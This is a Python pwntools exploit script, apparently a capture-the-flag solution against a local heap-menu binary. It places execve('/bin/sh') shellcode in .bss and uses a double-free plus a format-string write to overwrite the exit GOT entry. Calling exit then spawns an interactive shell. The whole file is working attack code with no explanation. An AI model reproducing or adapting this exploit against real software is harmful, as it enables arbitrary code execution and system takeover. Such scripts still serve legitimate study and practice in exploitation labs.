#!/usr/bin/env python2

from pwn import *

shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

bss_addr = 0x0804B4A0
exit_got = 0x0804b450


class chunk_alloc:
    """
    Some structures to simplify communication with binary
    """
    def __init__(self, s):
        self.s = s

    def allocate(self, i, size, message):
        self.s.sendlineafter(">", '1')
        self.s.sendlineafter(":", str(i))
        self.s.sendlineafter(":", str(size))
        self.s.sendlineafter(":", message)
        self.s.sendline(' ')

    def list(self):
        self.s.sendlineafter('>', '2')

    def free(self, i):
        self.s.sendlineafter('>', '3')
        self.s.sendlineafter(':', str(i))
    
    def exit(self):
        self.s.sendlineafter(">", '4')

def main():
    s = connect('127.0.0.1', 60782) 
    c = chunk_alloc(s)
    exploit_double_free(c, shell_code, bss_addr, 0x20, 17)
    c.free(13)
    c.free(14)
    c.free(15)
    exploit_double_free(c, p32(bss_addr), exit_got, 0x30, 18)
    c.exit()
    c.s.interactive()

def exploit_double_free(c, payload, address, chunk_size, final_chunk):
    """
    Exploitation of double free vulnerability 
    """
    c.allocate(13, chunk_size, "any_message")
    c.allocate(14, chunk_size, "any_message")
    c.free(13)
    c.free(14)
    c.allocate(15, chunk_size+0x20, "%{}x%6$hn".format(str(int("10000000000000", 2))))
    c.list()
    c.free(13)
    c.allocate(13, chunk_size, p32(address))
    c.allocate(14, chunk_size, "any_message")
    c.allocate(15, chunk_size, "any_message")
    c.allocate(final_chunk, chunk_size, payload)

if __name__ == "__main__":
    main()

